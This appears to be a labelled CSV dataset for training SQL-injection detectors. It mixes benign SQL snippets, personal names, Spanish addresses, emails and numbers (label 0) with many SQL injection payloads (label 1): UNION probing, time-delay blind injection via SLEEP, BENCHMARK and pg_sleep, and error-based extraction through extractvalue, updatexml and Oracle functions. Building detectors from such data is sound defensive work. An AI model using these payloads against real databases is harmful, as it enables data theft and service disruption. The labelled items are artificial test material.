Query,Label
1'||  (  sELect 'vvpn' FrOM dual whERe 7011  =  7011 aND 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  sELect   (  caSE WheN   (  7756  =  7756  )   tHEn 1 ElSe 0 eNd  )   FrOM dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   ||',1
ag-uzadura,0
1%'  )   AND 4595  =  4595#,1
SELECT * FROM thrown FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM company,0
"iif  (  7953  =  3021,1,1/0  )",1
"sELEcT count  (  *  )   frOM generate_series  (  1,5000000  )   ANd   (  'tnvm' liKE 'tnvm",1
"-9854  )   oR 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  seLEcT   (  cAse WHEN   (  5023  =  5023  )   THen 1 ElsE 0 end  )   From dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   aNd   (  5696  =  5696",1
DELETE FROM seems WHERE cream = 'production',0
"c/ cels gomis i mestre 171,",0
1'+  (  seleCT wpbj WHEre 1849  =  1849,1
"paseo pinos, 147",0
"-3971%'   )    )     )   Or elt  (  1032  =  1032,3623  )   aND    (    (     (  '%'  =  '",1
SELECT TOP 3 * FROM each SELECT * FROM oil 3SELECT * FROM behind,0
SELECT part ( s )  FROM cannot LEFT JOIN,0
"call regexp_substring  (  repeat  (  lEFt  (  crypt_key  (  ChAR  (  65  )  ||ChAR  (  69  )  ||ChAR  (  83  )  ,NULL  )  ,0  )  ,500000000  )  ,NULL  )   AnD '%'  =  '",1
"-4477'   )    )    uNiOn aLl sElecT 8444,8444,8444,8444,8444,8444,8444,8444--",1
"1 whEre 2031  =  2031 OR 5356  =    (  SElECT count  (  *  )   fRom sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7  )  --",1
SELECT COUNT ( box ) FROM balance,0
SELECT * FROM electricity FETCH FIRST 3 ROWS ONLY,0
1 AnD 3715 iN    (    (   CHaR  (  113  )  +CHaR  (  113  )  +CHaR  (  112  )  +CHaR  (  106  )  +CHaR  (  113  )  +  (  sELecT   (  cAse wHEN   (  3715  =  3715  )   THen CHaR  (  49  )   ElSe CHaR  (  48  )   end   )    )   +CHaR  (  113  )  +CHaR  (  122  )  +CHaR  (  118  )  +CHaR  (  122  )  +CHaR  (  113   )    )     ),1
1%' rlike   (  sELect   (  caSe WhEn   (  3596  =  4245  )   thEn 1 else 0x28 eNd   )    )    and '%'  =  ',1
SELECT * FROM essential FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM horse,0
"-3873%'   )    )    Or 1 gRouP by concat  (  0x7171706a71,  (  SelECT   (  Case wHEn   (  4232  =  4232  )   theN 1 elsE 0 End   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    HAvInG min  (  0  )  #",1
"SELECT low,bound,develop,kill,older     (  (  string JOIN beyond ON youth.speed =  studying.bend )   INNER JOIN masterON Orders.feel =  greatly.trackID )",0
"1'  )   AS uqkz WHere 8482  =  8482 aNd 8407  =    (  SELeCt count  (  *  )   fROm generate_series  (  1,5000000   )    )   --",1
SELECT TOP 50 PERCENT * FROM went SELECT * FROM that FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM ear,0
ENd aND   (  '%'  =  ',1
"-6987' UNIon ALl sELeCT 4721,4721--",1
equilibrio,0
cagarria,0
-3677'   )    )    oR 1939  =  4484,1
SELECT * FROM clothing WHERE laugh BETWEEN '1996-07-01' AND '1996-07-31',0
"1'||  (  selECT 'mzhj' WHerE 9677  =  9677 UnIoN alL selECT nULl,nULl,nULl--",1
milton,0
SELECT secret ( s FROM must RIGHT JOIN,0
-4583'  )   AS evbo WHErE 6055  =  6055 uNiON alL SelecT 6055--,1
45810,0
SELECT Count ( * )  AS women,0
"SelECt count  (  *  )   fRoM all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ANd   (  ""snwx"" lIkE ""snwx",1
SELECT Count ( * )  AS route,0
SELECT fought ( s )  FROM planned,0
"-5996  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  SElECT   (  case whEn   (  5023  =  5023  )   tHEn 1 eLse 0 End  )   FROm dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )",1
"1%'   )    )    aND make_set  (  6527  =  9529,9529  )   aND    (    (   '%'  =  '",1
"SELECT lack, no, previousFROM twenty WHERE nails  IS NOT NULL",0
lavada,0
"1   )    )    AS nxdf WHERE 1696  =  1696 Or 8514  =  BEnCHMark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
arimany aguila,0
SELECT * FROM nervous WHERE burn  BETWEEN 10 AND 20,0
SELECT AVG ( consist ) FROM getting SELECT SUM ( pen ),0
"SELECT bagID AS ID, rush AS young FROM material",0
SELECT * FROM spread FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM himself,0
"SELECT * FROM rather WHERE anything IN  ( 'doctor', 'examine', 'well' )",0
/**/OR/**/1/**/  =  /**/1,1
"calle prat de la riba, 73",0
SELECT AVG ( neck ) FROM leader,0
"1'||  (  sELEct 'jzwq' WHere 3289  =  3289 Union all sELEct nuLl,nuLl,nuLl,nuLl,nuLl,nuLl,nuLl#",1
SELECT COUNT ( darknessID ) FROM nodded,0
SELECT * FROM bare WHERE tomorrow BETWEEN bent09/01/1996improve AND clock15/31/1996musical,0
if  (  8995  =  9787  )   SeLEcT 8995 ELSE Drop function ofgg--,1
"1  )   aND 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  sELeCt   (  caSE whEn   (  6055  =  6055  )   thEN 1 ELSE 0 eND  )   fRom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )",1
SElect * fRom users whErE id  =  1 <@.$ or 1  =  1 -- 1,1
SELECT TOP 3 * FROM between,0
"SELECT Orders.sayrID, Employees.rose, Employees.steep FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.foxID ORDER BY Orders.climateID",0
hoog,0
geffner-schoo@bacoespecialseleccin.bm,0
"SELECT giant AS rhyme, copper AS [particular]  FROM loose",0
SELECT * FROM log WHERE primitive  BETWEEN 10 AND 20,0
"1""   )    )     )   AND 6240  =    (  'qqpjq'||  (  SelEcT CaSe 6240 whEN 6240 THeN 1 eLse 0 eNd fROm rdb$DaTABAsE  )  ||'qzvzq'  )   AND    (    (     (  ""buwe""  =  ""buwe",1
SELECT memory ( s )  FROM powerful SELECT lying FROM money,0
SELECT COUNT ( DISTINCT serve )  FROM completely,0
"SELECT column_name ( s )  FROM itself,atom",0
"1""  )   OR SLeEp  (  5  )   and   (  ""xgtk""  =  ""xgtk",1
8.42194E+15,0
1   )    )     )   aNd 8990  =  4775 aNd    (    (     (  1894  =  1894,1
"-3767'  )   AS eefl Where 8260  =  8260 uNIOn aLL SELEcT 8260,8260,8260,8260,8260,8260,8260#",1
ruesga,0
palls de buran,0
50344,0
"-8707'  )   union ALL seLECT 5609,5609,5609--",1
1   )    )    as fqee WHERE 3286  =  3286,1
gaspard-birgel@indorec.kr,0
"1' In boolean mode  )   UniOn AlL SElecT nUll,nUll,nUll,nUll,nUll,nUll,nUll,nUll--",1
"SELECT longer, rocky, sweet FROM metal WHERE someone  IS NULL",0
7395,0
"1%'  )   AnD extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  seLEct   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    AnD   (  '%'  =  '",1
"sELEcT * FRom users WHERE id  =  1 <@. UnIoN sELEcT 1,VErsiON  (    )   -- 1",1
"seLecT * froM generate_series  (  8147,8147,casE when   (  8147  =  6336  )   TheN 1 elSe 0 EnD  )   LiMIt 1--",1
SELECT * FROM twelve WHERE example = 'use'  AND City = 'unless',0
17130,0
SELECT * FROM deeply WHERE negative NOT BETWEEN 'usual' AND 'plastic',0
"1'  )   as ezoa WHeRE 4915  =  4915 AnD 9660  =    (  selEct count  (  *  )   FROM all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
SELECT * FROM cause WHERE atomic = 'plural',0
1'  )   wherE 1424  =  1424 anD SleEp  (  5  )  --,1
"-5204""  )   UNION aLL SELEcT 7186,7186,7186--",1
"-7635"" unIOn ALl SeLeCt 1284,1284,1284,1284,1284,1284#",1
"-7802'   )    )     )   or elt  (  8778  =  9974,9974  )   ANd    (    (     (  'glsq' like 'glsq",1
"1""   )    )    as jikg WhEre 8258  =  8258 AnD   (  3973  =  1047  )  *1047--",1
"1'+  (  sELEct 'arqt' WheRE 2336  =  2336 OR CHar  (  75  )  ||CHar  (  70  )  ||CHar  (  99  )  ||CHar  (  83  )    =  regexp_substring  (  repeat  (  LEft  (  crypt_key  (  CHar  (  65  )  ||CHar  (  69  )  ||CHar  (  83  )  ,NULl  )  ,0  )  ,500000000  )  ,NULl  )  --",1
SELECT * FROM win ORDER BY advice,0
DELETE FROM satellites,0
"SELECT MAKEDATE ( 2017, 366 ) ;",0
SELECT AVG ( begun ) FROM band SELECT SUM ( chosen ),0
levert,0
"diamante, 114,",0
cracoviano,0
SELECT * FROM notice FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM cross,0
SELECT * FROM  ( SELECT instance FROM coach ),0
"SELECT t.*, tt.* FROM wp_terms AS t INNER JOIN wp_term_taxonomy AS tt ON t.term_id  =  tt.term_id WHERE tt.taxonomy IN  ( 'support_cat' )  AND t.term_id IN  (  2637  )",0
SELECT * FROM nose WHERE zero = 'slope'  AND City = 'muscle',0
DELETE FROM forty WHERE till = 'come',0
"1%' Or 4915  =    (  SelECt count  (  *  )   FRom domain.domains aS t1,domain.columns aS t2,domain.tables aS t3  )  --",1
"1'+  (  sEleCT 'sacd' wHere 5984  =  5984 UNIon aLl sEleCT nuLl,nuLl,nuLl,nuLl,nuLl,nuLl,nuLl#",1
"1'+  (  SeLEct 'eoxk' WHEre 6621  =  6621 UNION AlL SeLEct Null,Null#",1
"1'  )   wheRe 7093  =  7093 AND 8148  =  lIKe  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
"1'  )   Or ChAR  (  117  )  ||ChAR  (  111  )  ||ChAR  (  105  )  ||ChAR  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  ChAR  (  65  )  ||ChAR  (  69  )  ||ChAR  (  83  )  ,nULL  )  ,0  )  ,500000000  )  ,nULL  )   ANd   (  'ozef'  =  'ozef",1
"SELECT circleID AS ID, stove AS headed FROM thing",0
SELECT * FROM slip FETCH FIRST 50 PERCENT ROWS ONLY,0
"1"" WhEre 1452  =  1452 uNION All sEleCT nulL,nulL,nulL,nulL--",1
SELECT * FROM coal WHERE foot = 'above' FETCH FIRST 3 ROWS ONLY,0
"SelECt count  (  *  )   fROM rdb$fields AS t1,rdb$types AS t2,rdb$collations AS t3,rdb$functions AS t4 aND 'bnfu' lIKe 'bnfu",1
"1%""  )   or SLeep  (  5  )   And   (  ""%""  =  """,1
SELECT * FROM thus 3,0
SELECT * FROM  ( SELECT mind FROM between ),0
48289,0
takakura@cenitsoria.sb,0
SELECT * FROM consonant WHERE regular LIKE '%now%',0
"paso de la soledad, 130 10?f",0
shedd,0
48042322z,0
SELECT * FROM rope WHERE Price NOT BETWEEN 10 AND 20,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 193 )  ORDER BY meta_id ASC",0
"-7812'  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  SeleCT   (  casE wHEN   (  5023  =  5023  )   tHen 1 eLsE 0 end  )   froM dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   ANd   (  'ttvo'  =  'ttvo",1
shirleen,0
SELECT AVG ( out ) FROM colony,0
vildo@prensahp.fj,0
SELECT roof ( s ) FROM diameter INNER JOIN,0
SELECT stick ( s ) FROM gentle INNER JOIN,0
SELECT * FROM grain WHERE positive = 'matter'  OR remember = 'warm',0
1'||  (  seLECt 'bqhi' froM dual WhERE 7409  =  7409,1
"INSERT INTO respect  ( say, officer, on )  VALUES  ( 'ruler', 'party', 'gradually' )",0
"SELECT personalID AS ID, tape AS couple FROM happy",0
SELECT AVG ( molecular )  FROM week  SELECT SUM ( everywhere ),0
SELECT * FROM fun WHERE    NOT travel = 'pair',0
"SELECT column_name ( s )  FROM tea,child",0
"1""  )   and 8677  =  9054#",1
ren,0
SELECT * FROM eight FETCH FIRST 50 PERCENT ROWS ONLY,0
orejana,0
"1'   )    )    As prxm WHERe 1267  =  1267 aNd 3580  =    (  sELeCT count  (  *  )   FrOM domain.domains As t1,domain.columns As t2,domain.tables As t3  )  --",1
brenda,0
5.65818E+15,0
SELECT * FROM who WHERE pure BETWEEN round09/01/1996believed AND four15/31/1996build,0
"1"" AND 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1
"-7845' UnIOn All SeLect 9574,9574,9574,9574,9574,9574#",1
17154,0
"1  )   UniOn ALl SeleCt nulL,nulL#",1
murad@magadan.org.pe,0
17005940q,0
1   )    )    aS oqyo wHere 7995  =  7995,1
SELECT week ( s )  FROM outside SELECT pot FROM during,0
"SELECT moreID AS ID, studied AS social FROM movement",0
"1"" ANd elt  (  1210  =  1210,SleEP  (  5   )    )    ANd ""zhxm""  =  ""zhxm",1
"1"" WheRE 6800  =  6800 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  beNchMARk  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1
"CREATE TABLE IF NOT EXISTS `zcf_submitlogs`  (  `id` int ( 6 )  unsigned NOT NULL AUTO_INCREMENT, `crmsubmitlogStatus` varchar ( 20 )  DEFAULT NULL, `crmsubmitlogDescribtion` longtext NOT NULL, `crmsubmitFormType` varchar ( 30 )  NOT NULL, PRIMARY KEY  (  id  )   )  ENGINE = InnoDB DEFAULT CHARSET = utf8",0
1  )   WHEre 1929  =  1929 ANd   (  SELeCT * frOM   (  SELeCT  (  sLeeP  (  5   )    )     )  fzno  )  --,1
"(  sEleCT count  (  *  )   FrOm rdb$fields aS t1,rdb$types aS t2,rdb$collations aS t3,rdb$functions aS t4  )",1
"SELECT * FROM being ORDER BY said ASC, coal DESC",0
"1""  )   As bpmk wheRe 6412  =  6412 union aLl SeleCT NUll,NUll,NUll,NUll#",1
FROM  ( SELECT DISTINCT bend FROM village ),0
"-3270%' OR elt  (  9404  =  3498,3498  )   AnD '%'  =  '",1
"-6587'  )   uniON All selecT 6349,6349,6349,6349,6349,6349,6349,6349,6349,6349--",1
"1""  )   whErE 2473  =  2473 anD make_set  (  6118  =  7684,7684  )  --",1
08109487d,0
"SeLecT count  (  *  )   FROm all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 aND    (    (     (  'juhi' liKE 'juhi",1
SELECT MIN ( wood )  AS union FROM disease,0
1' wHeRe 5455  =  5455 And sLeeP  (  5  )  --,1
"SELECT * FROM label ORDER BY rocket, particularly",0
"SELECT cheeseID AS ID, obtain AS fed FROM stay",0
SELECT * FROM complex WHERE struck = 'chosen'  OR measure = 'blood',0
SELECT * FROM star WHERE Price NOT BETWEEN 10 AND 20,0
04or2ativ1,0
SELECT ACOS ( -0.8 ) ;,0
"(  SELECt * From   (  SELECt  (  sLeeP  (  5   )    )     )  srmq  )   ANd    (    (   ""%""  =  """,1
canciano,0
SELECT * FROM steam WHERE automobile = 'pen'  AND  ( electricity = 'instrument' OR ordinary = 'policeman' ),0
"1""  )   oR 6793  =    (  sElecT 6793 frOM pg_sleep  (  5   )    )    AnD   (  ""lsis"" liKE ""lsis",1
"SELECT explainID AS ID, beautiful AS eager FROM with",0
"-2962'   )    )     )   OR 1570  =  cONVert  (  int,  (  sELecT CHAR  (  113  )  +CHAR  (  113  )  +CHAR  (  112  )  +CHAR  (  106  )  +CHAR  (  113  )  +  (  sELecT   (  cASe wHEN   (  1570  =  1570  )   then CHAR  (  49  )   ELse CHAR  (  48  )   eNd   )    )   +CHAR  (  113  )  +CHAR  (  122  )  +CHAR  (  118  )  +CHAR  (  122  )  +CHAR  (  113   )    )     )   AND    (    (     (  'hkjo'  =  'hkjo",1
1.62177E+15,0
SELECT * FROM judge WHERE rain = 'power'  OR pull = 'month',0
"selEcT * fROm users wHErE id  =  1.<@$ uNIoN selEcT 1,vERSiON  (    )   -- 1",1
-7624'  )   oR 5903  =    (  'qqpjq'||  (  SeLeCt casE 5903 whEN 5903 thEN 1 ElsE 0 EnD FrOM rdb$daTAbasE  )  ||'qzvzq'  )   And   (  'iwab'  =  'iwab,1
"-1591 WHeRE 3291  =  3291 uNION ALl SELeCT 3291,3291,3291,3291,3291,3291,3291,3291,3291#",1
"1"" AND row  (  6237,7469  )  >  (  sElect count  (  *  )  ,concat  (  0x7171706a71,  (  sElect   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x FrOM   (  sElect 5192 uNIon sElect 3785 uNIon sElect 3931 uNIon sElect 7158  )  a grOUp BY x  )",1
SELECT dollar,0
1'  )   aND 3754  =    (  SeLect upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  SeLect   (  CASE WHen   (  3754  =  3754  )   ThEn 1 else 0 eNd  )   FrOm dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   FrOm dual  )   aND   (  'ulkq'  =  'ulkq,1
"-2548""   )    )     )   oR 5107  =  8049--",1
SELECT AVG ( ice ) FROM universe,0
FROM  ( SELECT DISTINCT twice FROM larger ),0
"INSERT INTO vote ( flat, trap, card, score, correctly, law )  VALUES  ( 'market', 'chose'. zero', 'within', 'gas', 'waste', 'screen' )",0
ENd aNd    (    (     (  3673  =  3673,1
SELECT * FROM least 3 SELECT * FROM love,0
nogueira de ramun,0
cholgua,0
hoeflich@movil-google.cx,0
SELECT stepped FROM necessary UNION ALL SELECT suppose FROM start ORDER BY lead,0
"1""   )    )    OR   (  SELecT 2*  (  if   (    (   SELecT * fRoM   (  SELecT concat  (  0x7171706a71,  (  SELecT   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   anD    (    (   ""nobt""  =  ""nobt",1
SELECT * FROM grew FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM weigh,0
sempronia,0
"1' In boolean mode  )   Or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  sELEcT   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  #",1
"c/ aulencia, 84",0
"1"" And 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  sELECT   (  cASe WHEn   (  7756  =  7756  )   ThEN 1 ELSe 0 enD  )   FROm dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   And ""jgcv""  =  ""jgcv",1
1'||  (  SELEct 'znba' WheRE 8323  =  8323,1
wambsgan,0
SELECT COUNT ( DISTINCT visit )  FROM prove,0
ornela,0
"1' WHERe 9994  =  9994 AND 9660  =    (  SElECT count  (  *  )   FroM all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"1'   )    )     )   ANd CHAr  (  111  )  ||CHAr  (  77  )  ||CHAr  (  121  )  ||CHAr  (  88  )    =  regexp_substring  (  repeat  (  LEft  (  crypt_key  (  CHAr  (  65  )  ||CHAr  (  69  )  ||CHAr  (  83  )  ,nuLL  )  ,0  )  ,500000000  )  ,nuLL  )   ANd    (    (     (  'tvar'  =  'tvar",1
"1%'  )   OR cHAR  (  119  )  ||cHAR  (  100  )  ||cHAR  (  99  )  ||cHAR  (  121  )    =  regexp_substring  (  repeat  (  RIghT  (  cHAR  (  1441  )  ,0  )  ,5000000000  )  ,nUlL  )  --",1
8.83352E+15,0
SELECT * FROM college WHERE thing = 'lake'  AND City = 'spider',0
esbarar,0
"1%'   )    )    AND 4241  =  CoNVert  (  int,  (  SelEcT CHAr  (  113  )  +CHAr  (  113  )  +CHAr  (  112  )  +CHAr  (  106  )  +CHAr  (  113  )  +  (  SelEcT   (  cASE wHEN   (  4241  =  4241  )   THEn CHAr  (  49  )   ElsE CHAr  (  48  )   enD   )    )   +CHAr  (  113  )  +CHAr  (  122  )  +CHAr  (  118  )  +CHAr  (  122  )  +CHAr  (  113   )    )     )   AND    (    (   '%'  =  '",1
1%'   )    )     )   And 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  sElEct   (  case wHEn   (  4386  =  4386  )   thEN 1 ELse 0 end  )   FroM dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    And    (    (     (  '%'  =  ',1
"seLEct * froM generate_series  (  1134,1134,cAsE wHeN   (  1134  =  4909  )   tHen 1 ELse 0 EnD  )   lImIT 1--",1
yasna,0
SELECT AVG ( Price ) FROM available,0
"1%""   )    )    anD 3754  =    (  sElECT upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  sElECT   (  Case wheN   (  3754  =  3754  )   THen 1 ELSE 0 eND  )   fRom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   fRom dual  )   anD    (    (   ""%""  =  """,1
86943454g,0
"1"" wHeRe 6686  =  6686 Or elt  (  6272  =  6272,sLEeP  (  5   )    )   --",1
SELECT CURRENT_TIMESTAMP (  )  + 1;,0
selecT   (  CasE When   (  6179  =  8476  )   tHen 6179 ELSe CAst  (  1 aS int  )  /  (  selecT 0 fROM dual  )   End  )   fROM dual--,1
44923287d,0
philipp.castella@biopoint.vc,0
46793939w,0
1'+  (  SELECT ukwc wherE 3008  =  3008 or   (  SELECT * FROm   (  SELECT  (  SleEP  (  5   )    )     )  sddo  )  #,1
blancafort,0
SELECT * FROM shout WHERE means = 'eye'  OR sad = 'win',0
"SELECT islandID AS ID, skin AS because FROM thousand",0
pascuet landivar,0
"1'||  (  sELecT 'mwmn' whERE 5112  =  5112 or   (  sELecT 9173 From  (  sELecT count  (  *  )  ,concat  (  0x7171706a71,  (  sELecT   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x From information_schema.character_sets gRoUP BY x  )  a   )    )   ||'",1
SELECT TOP 3 * FROM finest WHERE bread = 'secret',0
SELECT * FROM what WHERE by = 'quarter',0
us,0
SELECT edge,0
"SElECT SlEeP  (  5  )   aND   (  ""%""  =  """,1
"-3368'   )    )    UNiOn all seleCt 4913,4913,4913,4913,4913,4913,4913,4913,4913--",1
"-8026 or elt  (  8434  =  4516,4516  )  # bsqo",1
56,0
DELETE FROM somehow WHERE factor = 'fruit',0
"1   )    )    aS jfae whERe 6684  =  6684 And 2716  =    (  SeLEct count  (  *  )   FROm sysusers aS sys1,sysusers aS sys2,sysusers aS sys3,sysusers aS sys4,sysusers aS sys5,sysusers aS sys6,sysusers aS sys7  )  --",1
SELECT afternoon,0
"1 WHERe 7196  =  7196 or 8466  =  bENCHMARk  (  5000000,md5  (  0x694a4745   )    )   --",1
basilisa,0
